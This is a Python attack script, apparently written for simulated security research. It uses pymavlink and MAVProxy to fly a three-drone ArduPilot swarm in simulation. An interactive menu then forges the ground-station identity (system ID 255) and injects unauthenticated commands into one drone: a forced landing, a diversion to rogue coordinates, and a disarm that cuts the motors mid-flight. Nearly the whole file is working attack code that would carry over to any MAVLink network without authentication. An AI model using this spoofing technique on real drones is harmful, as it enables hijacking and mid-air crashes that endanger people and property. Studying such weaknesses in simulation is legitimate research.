#!/usr/bin/env python3
"""
MAVProxy Shared Bus Spoof Attack
----------------------------------
Architecture:
  SITL Drone1 (TCP 5760) ──┐
  SITL Drone2 (TCP 5770) ──┤──> MAVProxy router ──> script connections
  SITL Drone3 (TCP 5780) ──┘

  This is a genuine attack simulation. The spoof_conn sends packets
  through MAVProxy's shared bus — exactly like a compromised radio node
  on a real swarm network. Drone3 receives commands from sysid=255 and
  cannot distinguish them from legitimate GCS traffic.

Swarm:
  Drone1  ->  AUTO waypoint mission
  Drone2  ->  mirrors Drone1 position (GUIDED)
  Drone3  ->  follows Drone2 at +20m north (GUIDED)

Attack:
  spoof_conn forges srcSystem=255 (GCS identity) and injects commands
  into the shared bus. MAVProxy routes them to all SITL instances.
  Drone3 (target_system=3) executes them. Drone1/Drone2 ignore them.

For SITL security research only.
"""

import subprocess
import time
import threading
import sys
from pymavlink import mavutil

# ── MAVProxy router config ────────────────────────────────────────────────────
# sim_vehicle's internal MAVProxy already holds the SITL TCP connections.
# SITL only accepts one TCP client, so we can't connect another MAVProxy there.
# Instead, bind to sim_vehicle's existing UDP script-output ports (14551/14561/14571).
# sim_vehicle pushes MAVLink to those ports — our router receives it and re-broadcasts.

SITL_MASTERS = [
    "udp:0.0.0.0:14551",   # Drone1 script port  (-I 0)
    "udp:0.0.0.0:14561",   # Drone2 script port  (-I 1)
    "udp:0.0.0.0:14571",   # Drone3 script port  (-I 2)
]

# Four output ports — one per connection to avoid recv race conditions
SETUP_PORT  = 14600   # main thread: arm / takeoff / mission upload
T1_PORT     = 14601   # thread T1: reads Drone1 pos → commands Drone2
T2_PORT     = 14602   # thread T2: reads Drone2 pos → commands Drone3
SPOOF_PORT  = 14603   # attack: forged GCS commands → Drone3

# ── drone config ─────────────────────────────────────────────────────────────

DRONE1_SYSID = 1
DRONE2_SYSID = 2
DRONE3_SYSID = 3

WPL_FILE     = "../missions/drone1.wpl"
TAKEOFF_ALT  = 30        # metres, must match WPL altitude

FOLLOW_OFFSET_X = 20.0   # Drone3 trails Drone2 by 20m north
FOLLOW_OFFSET_Y = 0.0
FOLLOW_OFFSET_Z = 0.0    # same altitude (NED: z negative = up)

ROGUE_LAT = -35.3600     # attack divert destination (~500m from SITL home)
ROGUE_LON =  149.1700
ROGUE_ALT =  30.0


# ── MAVProxy subprocess ───────────────────────────────────────────────────────

def start_mavproxy():
    # kill any leftover router from a previous run
    subprocess.run(["pkill", "-f", f"mavproxy.*{SETUP_PORT}"], capture_output=True)
    time.sleep(1)

    cmd = ["mavproxy.py"]
    for master in SITL_MASTERS:
        cmd += ["--master", master]
    for port in [SETUP_PORT, T1_PORT, T2_PORT, SPOOF_PORT]:
        cmd += ["--out", f"udp:127.0.0.1:{port}"]
    cmd += ["--non-interactive"]

    print(f"[*] Starting MAVProxy router...")
    print(f"    Masters : {', '.join(SITL_MASTERS)}")
    print(f"    Outputs : {SETUP_PORT}, {T1_PORT}, {T2_PORT}, {SPOOF_PORT}")

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    print("[*] Waiting 5s for MAVProxy to connect to all SITL instances...")
    time.sleep(5)

    if proc.poll() is not None:
        out, err = proc.communicate()
        print(f"[-] MAVProxy exited early.\nSTDOUT: {out.decode()}\nSTDERR: {err.decode()}")
        sys.exit(1)

    print("[+] MAVProxy router running.")
    return proc


# ── connection ────────────────────────────────────────────────────────────────

def connect(port, name, source_system=255):
    uri = f"udp:127.0.0.1:{port}"
    print(f"[+] Connecting {name} -> {uri}")
    c = mavutil.mavlink_connection(uri, source_system=source_system)
    msg = c.recv_match(type="HEARTBEAT", blocking=True, timeout=15)
    if not msg:
        print(f"[-] No heartbeat on port {port} after 15s.")
        print(f"    Is MAVProxy running and outputting to this port?")
        sys.exit(1)
    print(f"[+] {name} ready (heartbeat from sysid={msg.get_srcSystem()}).")
    return c


# ── mode / arm / takeoff ──────────────────────────────────────────────────────

def set_mode(conn, sysid, mode_str):
    mode_id = conn.mode_mapping()[mode_str]
    conn.mav.set_mode_send(
        sysid,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id
    )
    time.sleep(0.5)


def arm(conn, sysid, name):
    print(f"[*] Arming {name} (sysid={sysid})...")
    set_mode(conn, sysid, "GUIDED")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1, 0, 0, 0, 0, 0, 0
    )
    for _ in range(30):
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=1)
        if msg and msg.get_srcSystem() == sysid and \
                (msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            print(f"[+] {name} armed.")
            return True
        time.sleep(0.5)
    print(f"[-] {name} failed to arm. Try: param set ARMING_CHECK 0 in MAVProxy.")
    return False


def takeoff(conn, sysid, name, alt):
    print(f"[*] Takeoff {name} -> {alt}m")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        0, 0, 0, 0, 0, 0, 0, alt
    )


# ── mission upload ────────────────────────────────────────────────────────────

def parse_wpl(path):
    waypoints = []
    with open(path) as f:
        lines = f.readlines()
    assert lines[0].strip().startswith("QGC WPL"), "Not a valid QGC WPL file."
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 12:
            continue
        waypoints.append((
            int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3]),
            float(parts[4]), float(parts[5]), float(parts[6]), float(parts[7]),
            float(parts[8]), float(parts[9]), float(parts[10]), int(parts[11])
        ))
    return waypoints


def upload_mission(conn, sysid, waypoints):
    print(f"[*] Uploading {len(waypoints)} waypoints to sysid={sysid}...")
    indexed = [
        (i, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac)
        for i, (_, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac) in enumerate(waypoints)
    ]
    conn.mav.mission_count_send(sysid, 0, len(indexed))
    sent = 0
    while sent < len(indexed):
        msg = conn.recv_match(type=["MISSION_REQUEST", "MISSION_REQUEST_INT"],
                              blocking=True, timeout=5)
        if not msg:
            print(f"[-] No MISSION_REQUEST (sent {sent}/{len(indexed)})")
            return False
        req_seq = msg.seq
        if req_seq >= len(indexed):
            print(f"[-] Vehicle requested out-of-range seq {req_seq}")
            return False
        seq, cur, fr, cmd, p1, p2, p3, p4, x, y, z, ac = indexed[req_seq]
        conn.mav.mission_item_int_send(
            sysid, 0, seq, fr, cmd, cur, ac,
            p1, p2, p3, p4,
            int(x * 1e7), int(y * 1e7), z
        )
        sent += 1
    ack = conn.recv_match(type="MISSION_ACK", blocking=True, timeout=5)
    if ack and ack.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
        print("[+] Mission upload accepted.")
        return True
    print(f"[-] Mission upload failed. ACK: {ack}")
    return False


def start_mission(conn, sysid):
    print("[*] Starting AUTO mission on Drone1...")
    set_mode(conn, sysid, "AUTO")
    conn.mav.command_long_send(
        sysid, 0,
        mavutil.mavlink.MAV_CMD_MISSION_START,
        0, 0, 0, 0, 0, 0, 0, 0
    )


# ── background threads ────────────────────────────────────────────────────────

def thread_drone2_mirrors_drone1(t1_conn, stop_event):
    """
    T1: reads GLOBAL_POSITION_INT from Drone1 (sysid=1) on the shared bus,
    sends matching position target to Drone2. Rate: 5 Hz.
    """
    while not stop_event.is_set():
        msg = t1_conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
        if not msg or msg.get_srcSystem() != DRONE1_SYSID:
            continue
        lat = msg.lat / 1e7
        lon = msg.lon / 1e7
        alt = msg.relative_alt / 1000.0
        if alt < 1.0:
            continue
        t1_conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
            0, DRONE2_SYSID, 0,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(lat * 1e7), int(lon * 1e7), alt,
            0, 0, 0, 0, 0, 0, 0, 0
        ))
        time.sleep(0.2)


def thread_drone3_follows_drone2(t2_conn, stop_event):
    """
    T2: reads LOCAL_POSITION_NED from Drone2 (sysid=2) on the shared bus,
    sends offset position target to Drone3 at +20m north. Rate: 10 Hz.
    """
    while not stop_event.is_set():
        msg = t2_conn.recv_match(type="LOCAL_POSITION_NED", blocking=True, timeout=1)
        if not msg or msg.get_srcSystem() != DRONE2_SYSID:
            continue
        if msg.z > -2.0:   # NED z negative = up; skip if not airborne
            continue
        time_boot_ms = int((time.time() * 1000) % 0xFFFFFFFF)
        t2_conn.mav.set_position_target_local_ned_send(
            time_boot_ms,
            DRONE3_SYSID, 0,
            mavutil.mavlink.MAV_FRAME_LOCAL_NED,
            0b0000111111111000,
            msg.x + FOLLOW_OFFSET_X,
            msg.y + FOLLOW_OFFSET_Y,
            msg.z + FOLLOW_OFFSET_Z,
            0, 0, 0,
            0, 0, 0,
            0, 0
        )
        time.sleep(0.1)


# ── spoofed attack functions ──────────────────────────────────────────────────
# All commands go through spoof_conn (srcSystem=255, forged from sysid=2).
# MAVProxy broadcasts them on the shared bus. Drone3 sees sysid=255 and
# cannot distinguish this from a legitimate GCS command.

def spoof_land(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] Injecting LAND via shared bus...")
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0
    )


def spoof_goto(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] Injecting GOTO ({ROGUE_LAT}, {ROGUE_LON}) via shared bus...")
    # MAV_CMD_DO_SET_MODE avoids mode_mapping() — hardcode GUIDED=4 for ArduCopter
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE,
        0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        4,  # GUIDED
        0, 0, 0, 0, 0
    )
    time.sleep(0.5)
    spoof_conn.mav.send(mavutil.mavlink.MAVLink_set_position_target_global_int_message(
        0, DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        int(ROGUE_LAT * 1e7), int(ROGUE_LON * 1e7), ROGUE_ALT,
        0, 0, 0, 0, 0, 0, 0, 0
    ))


def spoof_disarm(spoof_conn):
    print(f"[SPOOFED GCS / sysid=255 -> Drone3] Injecting DISARM via shared bus (mid-flight!)...")
    spoof_conn.mav.command_long_send(
        DRONE3_SYSID, 0,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 0, 21196, 0, 0, 0, 0, 0
    )


ATTACKS = {
    "1": ("LAND   — force Drone3 to land mid-mission",    spoof_land),
    "2": ("GOTO   — divert Drone3 to rogue coordinates",  spoof_goto),
    "3": ("DISARM — cut Drone3 motors mid-flight",        spoof_disarm),
}


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print("""
==========================================================
  MAVProxy Shared Bus Spoof Attack — SITL Security Research
==========================================================
  Drone1 (sysid=1)  ->  AUTO waypoint mission
  Drone2 (sysid=2)  ->  mirrors Drone1 [legitimate]
  Drone3 (sysid=3)  ->  follows Drone2 at +20m N [legitimate]

  ** GENUINE ATTACK **
  spoof_conn sends forged sysid=255 packets through MAVProxy.
  MAVProxy routes them onto the shared bus — identical to a
  compromised radio node on a real swarm network.
  Drone3 cannot distinguish them from legitimate GCS traffic.
==========================================================
""")

    # --- start MAVProxy router ---
    router = start_mavproxy()

    # --- connect four script connections to MAVProxy outputs ---
    setup_conn = connect(SETUP_PORT, "setup_conn  (main)")
    t1_conn    = connect(T1_PORT,    "t1_conn     (T1 thread)")
    t2_conn    = connect(T2_PORT,    "t2_conn     (T2 thread)")

    print(f"[*] Connecting spoof_conn as sysid=2 (Drone2), then forging srcSystem=255...")
    spoof_conn = connect(SPOOF_PORT, "spoof_conn  (attack)", source_system=2)
    spoof_conn.mav.srcSystem = 255
    print(f"[SPOOF] Ready. Packets will travel through MAVProxy bus as sysid=255.")

    # --- arm all three via setup_conn ---
    for sysid, name in [(DRONE1_SYSID, "Drone1"),
                         (DRONE2_SYSID, "Drone2"),
                         (DRONE3_SYSID, "Drone3")]:
        if not arm(setup_conn, sysid, name):
            router.terminate()
            return

    # --- takeoff all three ---
    for sysid, name in [(DRONE1_SYSID, "Drone1"),
                         (DRONE2_SYSID, "Drone2"),
                         (DRONE3_SYSID, "Drone3")]:
        takeoff(setup_conn, sysid, name, TAKEOFF_ALT)

    print("[*] Waiting 5s for all drones to reach altitude...")
    time.sleep(5)

    # --- upload and start Drone1 mission ---
    waypoints = parse_wpl(WPL_FILE)
    if not upload_mission(setup_conn, DRONE1_SYSID, waypoints):
        router.terminate()
        return
    start_mission(setup_conn, DRONE1_SYSID)

    # --- start follow threads ---
    stop_event = threading.Event()
    t1 = threading.Thread(target=thread_drone2_mirrors_drone1, args=(t1_conn, stop_event), daemon=True)
    t2 = threading.Thread(target=thread_drone3_follows_drone2,  args=(t2_conn, stop_event), daemon=True)
    t1.start()
    t2.start()
    print("[*] Swarm active. Drone2 mirroring Drone1. Drone3 trailing Drone2 at +20m N.")

    # --- attack menu ---
    print("""
==========================================================
  ROGUE GCS ATTACK MENU
  Packets injected via MAVProxy shared bus (sysid=255 forged).
  Drone1 and Drone2 will ignore them (wrong target_system).
  Drone3 will execute them — no authentication.
""")
    for k, (label, _) in ATTACKS.items():
        print(f"    {k} -> {label}")
    print("    q -> quit")
    print("==========================================================\n")

    try:
        while True:
            choice = input("Attack [sysid=255 via MAVProxy]: ").strip().lower()
            if choice == "q":
                stop_event.set()
                router.terminate()
                print("[*] Router stopped. Exiting.")
                break
            if choice in ATTACKS:
                label, fn = ATTACKS[choice]
                print(f"\n[!!!] ATTACK: {label}")
                fn(spoof_conn)
                print(f"[NOTE] Drone1/Drone2 unaffected. Drone3 targeted via bus injection.\n")
            else:
                print("Unknown input. Options: 1  2  3  q")
    except KeyboardInterrupt:
        stop_event.set()
        router.terminate()
        print("\n[*] Interrupted. Router stopped.")


if __name__ == "__main__":
    main()
